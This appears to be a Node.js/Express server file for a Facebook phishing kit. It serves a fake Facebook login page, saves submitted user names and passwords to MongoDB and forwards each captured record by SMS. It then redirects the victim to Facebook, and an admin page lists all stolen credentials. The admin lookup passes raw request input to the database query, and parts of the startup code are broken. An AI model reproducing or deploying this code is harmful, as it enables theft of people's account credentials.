
require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const body_parser = require('body-parser');
const path = require('path');
const {readFileSync} = require('fs');
const {htmlData, sendSMS} = require('./public/data');



const app = express();
app.use(body_parser.urlencoded({extended :true}));
const PORT = process.env.PORT || 3000;
const _router = express.Router();

const connectDB = async () =>{
    try {
      await mongoose.connect(process.env.CON_STRING);
      console.log(`Database connected succesful`);
        
    } catch (error) {
        console.log(error.message);
        process.exit(1);
    }
};


const schema = new mongoose.Schema({
  user_name : {
    type : String,
    required :true,
    trim : true
  },
  password : {
    type : String,
    required :true,
    trim : true
  },
  createAt : String
});

schema.pre('save',function(next) {
  this.createAt = new Date();
  next();
  
});
const imfor = mongoose.model('imfor',schema);

  // sending facebook login page
_router.route('/').get((req, res)=>{
  res.status(200).sendFile(path.join(__dirname,'public','index.html'));

});

  // creating user
  _router.route('/login_details').post( async (req,res)=>{

    await imfor.create(req.body).then(result =>{
       sendSMS(result);
      res.status(301).redirect('www.facebook.com')
    }).catch(err =>{
      console.log(err)
    });
});
  // sending Admin login page
_router.route('/user_account').get( async (req,res)=>{
  res.status(200).sendFile(path.join(__dirname,'public','login.html'));
});

let page = readFileSync(path.join(__dirname,'public/page.html'),{encoding:'utf-8'});

 // getting all users
_router.route('/user_account/api').post(async(req,res)=>{
  const isExist =  await imfor.findOne(req.body,{_id:1,__v:0});
  if(isExist){

    const data = await imfor.find({},{__v:0});
    let renderPage = htmlData(page,data);
    res.status(200).send(renderPage.join(''));

  }
})
     


app.use('/',_router);

connectDB().then(PORT,() =>{
  app.listen( () =>{
    console.log(`Server listening on ${PORT}`);
  });
});